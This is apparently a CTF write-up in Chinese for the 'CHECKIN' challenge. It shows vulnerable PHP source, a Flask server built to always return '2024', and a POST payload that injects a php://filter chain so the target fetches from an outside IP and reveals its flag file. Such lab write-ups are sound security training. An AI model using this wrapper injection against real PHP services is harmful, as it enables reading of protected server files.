# CHECKIN

<img src="https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/checkin.jpg" alt="checkin" style="zoom:50%;" />

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$a=$_POST[1];
$b="php://filter/$a/resource=/dev/null";
if(file_get_contents($b)==="2024"){
    echo file_get_contents('/flag');
}else{
    echo $b;
}
```

当$a不输入内容时，$b为`php://filter//resource=/dev/null`

`file_get_contents`作用是获取所选内容

**exp(运行在服务器上)**

```python
from flask import Flask

app = Flask(__name__)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return '2024'


if __name__ == '__main__':
    app.run(debug=True, port=6666, host='0.0.0.0')
```

- `@app.route()`是`Flask`框架的一个装饰器，扩展原本函数功能的一种函数
- `app = Flask(__name__)`创建`Flask`类的实例
- `@app.route('/', defaults={'path': ''})`：访问`127.0.0.1:6666`触发函数`catch_all`，创建默认参数`path`为空字符串，此句的意义是<u>防止访问根路径时path为空，传参造成报错</u>
- `@app.route('/<path:path>')`：访问路径`/path`的中的`path字符串`传参给变量`path`，然后最后传给函数`catch_all`，因为上面path默认设置为空，所以`exp`的意思是<u>无论访问什么路径，都会得到 '2024' 的响应</u>

**Payload**

```python
POST传参
content-type:application/x-www-form-urlencoded

URL:http://91d4c737-deed-4020-8f66-fa27dfdafbf2.game.hscsec.cn:8080/

传参Body:
1=read=string.toupper/resource=http://23.94.212.183:6666

拼接的payload:
php://filter//resource=/dev/null
```

